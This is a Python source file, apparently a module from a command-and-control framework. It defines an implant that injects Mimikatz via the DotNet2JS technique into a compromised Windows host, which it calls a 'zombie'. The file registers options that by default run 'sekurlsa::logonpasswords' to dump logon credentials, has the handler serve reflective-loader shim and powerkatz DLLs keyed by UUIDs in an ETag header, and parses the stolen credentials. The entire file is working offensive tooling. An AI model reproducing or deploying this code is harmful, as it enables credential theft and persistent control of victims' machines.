import core.implant
import core.job
import core.cred_parser
import string

class DotNet2JSJob(core.job.Job):
    def create(self):
        # cant change this earlier, has to be job specific
        # i dont like it, but this is how we do this to make payload smaller
        if self.session.arch == "64":
            self.script = self.script.replace("~SHIMB64~", self.options.get("SHIMX64B64"))
            self.script = self.script.replace("~SHIMOFFSET~", self.options.get("SHIMX64OFFSET"))
        else:
            self.script = self.script.replace("~SHIMB64~", self.options.get("SHIMX86B64"))
            self.script = self.script.replace("~SHIMOFFSET~", self.options.get("SHIMX86OFFSET"))
        self.errstat = 0

    def parse_mimikatz(self, data):
        cp = core.cred_parser.CredParse(self.shell, self, self.session.ip, self.session.computer)
        self.mimi_output = cp.parse_mimikatz(data)

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')
        task = handler.get_header(self.options.get("UUIDHEADER"), False)

        if task == self.options.get("SHIMX64UUID"):
            handler.send_file(self.options.get("SHIMX64DLL"))

        if task == self.options.get("MIMIX64UUID"):
            handler.send_file(self.options.get("MIMIX64DLL"))

        if task == self.options.get("MIMIX86UUID"):
            handler.send_file(self.options.get("MIMIX86DLL"))

        if len(data) == 0:
            handler.reply(200)
            return

        if "mimikatz(powershell) # " in data:
            self.parse_mimikatz(data)
            handler.reply(200)
            return

        if data == "Complete" and self.errstat != 1:
            super(DotNet2JSJob, self).report(handler, data)

        #self.print_good(data)

        handler.reply(200)

    def done(self):
        self.display()

    def display(self):
        try:
            self.print_good(self.mimi_output)
        except:
            pass
        #self.shell.print_plain(str(self.errno))

class DotNet2JSImplant(core.implant.Implant):

    NAME = "Shellcode via DotNet2JS"
    DESCRIPTION = "Executes arbitrary shellcode using the DotNet2JS technique"
    AUTHORS = ["zerosum0x0", "Aleph-Naught-" "gentilwiki", "tiraniddo"]

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)

        self.options.register("MIMICMD", "sekurlsa::logonpasswords", "What Mimikatz command to run?", required=True)

        self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "relative path to mimishim.dll", required=True, advanced=True)
        self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "relative path to mimishim.x64.dll", required=True, advanced=True)
        self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "relative path to powerkatz32.dll", required=True, advanced=True)
        self.options.register("MIMIX64DLL", "data/bin/powerkatz64.dll", "relative path to powerkatz64.dll", required=True, advanced=True)

        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)

        self.options.register("SHIMX64UUID", "", "UUID", hidden=True)
        self.options.register("MIMIX64UUID", "", "UUID", hidden=True)
        self.options.register("MIMIX86UUID", "", "UUID", hidden=True)

        self.options.register("SHIMX86B64", "", "calculated bytes for arr_DLL", hidden=True)
        self.options.register("SHIMX64B64", "", "calculated bytes for arr_DLL", hidden=True)

        self.options.register("SHIMX86OFFSET", "6217", "Offset to the reflective loader", advanced = True)
        self.options.register("SHIMX64OFFSET", "7656", "Offset to the reflective loader", advanced = True)

        # self.options.register("SHIMB64", "", "calculated bytes for arr_DLL", advanced = True)
        # self.options.register("SHIMOFFSET", "", "Offset to the reflective loader", advanced = True)


    def dllb64(self, path):
        import base64
        with open(path, 'rb') as fileobj:
            text =  base64.b64encode(fileobj.read()).decode()
            index = 0
            ret = '"';
            for c in text:
                ret += str(c)
                index += 1
                if index % 100 == 0:
                    ret += '"+\r\n"'

            ret += '";'
            #print(ret)
            return ret

    def run(self):
        # self.shell.print_error("Plugin is busted. See GitHub issue #1.")
        # return

        import uuid
        self.options.set("DLLUUID", uuid.uuid4().hex)
        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
        self.options.set("MIMIX86UUID", uuid.uuid4().hex)

        self.options.set("SHIMX86B64", self.dllb64(self.options.get("SHIMX86DLL")))
        self.options.set("SHIMX64B64", self.dllb64(self.options.get("SHIMX64DLL")))

        workloads = {}
        workloads["js"] = self.loader.load_script("data/implant/inject/mimikatz_dotnet2js.js", self.options)

        self.dispatch(workloads, DotNet2JSJob)
